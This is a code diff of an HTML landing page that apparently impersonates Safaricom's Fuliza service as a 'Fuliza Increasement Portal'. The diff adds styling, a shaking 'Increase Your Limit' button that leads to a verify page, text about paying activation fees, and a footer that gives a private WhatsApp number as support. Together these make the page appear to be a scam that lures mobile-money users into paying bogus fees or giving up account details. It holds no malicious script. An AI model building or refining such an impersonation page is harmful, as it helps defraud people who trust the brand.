@@ -5,36 +5,178 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Safaricom Fuliza Portal</title>
 <link rel="stylesheet" href="style.css">
+<style>
+/* HERO SECTION */
+.hero {
+  background:white;
+  text-align:center;
+  padding:60px 20px;
+  border-radius:12px;
+  margin:25px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.08);
+  position: relative;
+}
+
+.hero h1 {
+  font-size:28px;
+  color:#1fb141;
+  margin-bottom:15px;
+}
+
+.hero p {
+  color:#555;
+  margin-bottom:40px;
+}
+
+.btn {
+  background:#1fb141;
+  color:white;
+  padding:12px 30px;
+  border-radius:30px;
+  text-decoration:none;
+  font-weight:bold;
+  display:inline-block;
+  font-size:18px;
+  position: relative;
+  transition: transform 0.2s ease;
+}
+
+/* Button shake animation */
+@keyframes shakeButton {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-4px); }
+  40% { transform: translateX(4px); }
+  60% { transform: translateX(-4px); }
+  80% { transform: translateX(4px); }
+  100% { transform: translateX(0); }
+}
+
+.btn.shake {
+  animation: shakeButton 1.2s infinite;
+}
+
+.btn:hover {
+  background:#169c37;
+  transform: scale(1.05);
+}
+
+/* Animated Hand */
+.hand-wrapper {
+  position: absolute;
+  left: 50%;
+  bottom: -50px;
+  transform: translateX(-50%);
+}
+
+.hand {
+  width:40px;
+  height:40px;
+  animation: bounceHand 1.2s infinite;
+  transform-origin: bottom center;
+}
+
+@keyframes bounceHand {
+  0%   { transform: translateY(0px) rotate(0deg); }
+  25%  { transform: translateY(-8px) rotate(-5deg); }
+  50%  { transform: translateY(-12px) rotate(5deg); }
+  75%  { transform: translateY(-8px) rotate(-5deg); }
+  100% { transform: translateY(0px) rotate(0deg); }
+}
+
+/* SERVICES CARD */
+.card {
+  background:white;
+  margin:25px;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.08);
+  text-align:center;
+}
+
+.card h2 {
+  color:#1fb141;
+  margin-bottom:10px;
+}
+
+.card p {
+  color:#555;
+}
+
+/* FOOTER */
+.footer {
+  background:#1fb141;
+  color:white;
+  padding:25px 20px;
+  text-align:center;
+  margin-top:40px;
+  border-radius:10px 10px 0 0;
+}
+
+.footer a {
+  color:white;
+  margin:0 10px;
+  text-decoration:underline;
+  font-size:14px;
+}
+
+.footer p {
+  margin-top:10px;
+  font-size:14px;
+  color:white;
+}
+
+/* TOP BAR BRAND */
+.topbar {
+  background:#1fb141;
+  padding:20px;
+  text-align:center;
+  font-size:22px;
+  color:white;
+  font-weight:bold;
+  border-radius:0 0 12px 12px;
+}
+
+@media(max-width:600px){
+  .hero, .card {
+    margin:15px;
+    padding:20px;
+  }
+}
+</style>
 </head>
+
 <body>
 
-<header class="top-bar">
-<img src="logo.png" class="logo">
+<!-- Top brand only -->
+<header class="topbar">
+  Safaricom Fuliza Increasement Portal
 </header>
 
-<header class="topbar">
-  <div class="logo">Safaricom</div>
-  <nav>
-    <a href="index.html">Home</a>
-    <a href="verify.html">Increase Fuliza</a>
-    <a href="faq.html">Help</a>
-  </nav>
+<header class="top-bar">
+<img src="logo.png" class="logo" alt="Safaricom Logo">
 </header>
 
 <section class="hero">
   <h1>Increase Your Fuliza Limit Online</h1>
   <p>Check balances, view limits, pay activation fees, and manage your services easily.</p>
-  <a href="verify.html" class="btn">Increase Your Limit</a>
+  
+  <!-- Button -->
+  <a href="verify.html" class="btn shake">Increase Your Limit</a>
 </section>
 
 <section class="card">
   <h2>Discover Our Services</h2>
-  <p>Access your account, pay fees, track transactions, and manage services anytime.</p>
+  <p>Access your account, pay fees, track transactions, and manage services anytime with convenience and security.</p>
 </section>
 
-<footer>
-© 2026 Safaricom Fuliza Increasement
+<footer class="footer">
+  <div>
+    <a href="terms.html">Terms & Conditions</a> |
+    <a href="privacy.html">Privacy Policy</a> |
+    <a href="support.html">Support</a>
+  </div>
+  <p>© 2026 Safaricom Fuliza Portal. For assistance, contact us at <a href="https://wa.me/254734997914" target="_blank">WhatsApp +254 734 997 914</a></p>
 </footer>
 
 </body>
-</html>
+  </html>
